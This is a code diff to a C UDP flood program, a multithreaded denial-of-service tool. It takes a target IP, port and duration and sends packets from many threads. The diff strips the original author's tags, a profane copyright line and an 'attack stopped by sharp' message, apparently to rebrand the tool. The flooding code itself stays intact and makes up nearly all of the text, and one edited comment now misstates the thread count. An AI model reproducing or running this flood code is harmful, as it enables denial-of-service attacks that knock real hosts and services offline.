@@ -34,7 +34,7 @@ void *udp_flood(void *arg) {
     struct sockaddr_in target;
     char buffer[BUFFER_SIZE];
 
-    #DILSESHARPCRACKS // Seed the random number generator with a unique value per thread
+    // Seed the random number generator with a unique value per thread
     srand(time(NULL) + data->thread_id);
 
     // Create the UDP socket
@@ -42,13 +42,13 @@ void *udp_flood(void *arg) {
     if (sockfd < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
-    } #DILSESHARPCRACKS 
+    }
 
     // Optimize socket buffer size for sending large quantities of packets
     int optval = 1 << 20; // 1 MB buffer
     setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));
 
-    // Set up target address information#DILSESHARPCRACKS 
+    // Set up target address information
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(data->port);
@@ -62,7 +62,7 @@ void *udp_flood(void *arg) {
     gettimeofday(&start_time, NULL);
     time_t end_time = start_time.tv_sec + data->duration;
 
-    // Loop until the duration expires#DILSESHARPCRACKS 
+    // Loop until the duration expires
     while (1) {
         gettimeofday(&current_time, NULL);
         if (current_time.tv_sec >= end_time) break;
@@ -74,8 +74,7 @@ void *udp_flood(void *arg) {
                 break;
             }
         }
-    } #DILSESHARPCRACKS 
-
+    }
 
     close(sockfd);
     pthread_exit(NULL);
@@ -90,7 +89,7 @@ int main(int argc, char *argv[]) {
     char *ip = argv[1];
     int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
-    int num_threads = MAX_THREADS; // Automatically set to 200 threads
+    int num_threads = MAX_THREADS; // Automatically set to 1 thread
 
     printf("Starting UDP flood to %s:%d with %d threads for %d seconds.\n", ip, port, num_threads, duration);
 
@@ -116,10 +115,7 @@ int main(int argc, char *argv[]) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("attack stopped by sharp.\n");
+    printf("Attack completed.\n");
 
     return 0;
 }
-
-#MADEBYSHARP
-#CP CLAIM 2020-2024, THIS C FILE FORM SHARP AND FUCK OFF COPY PASTERS AND FUCK MY HEATERS......
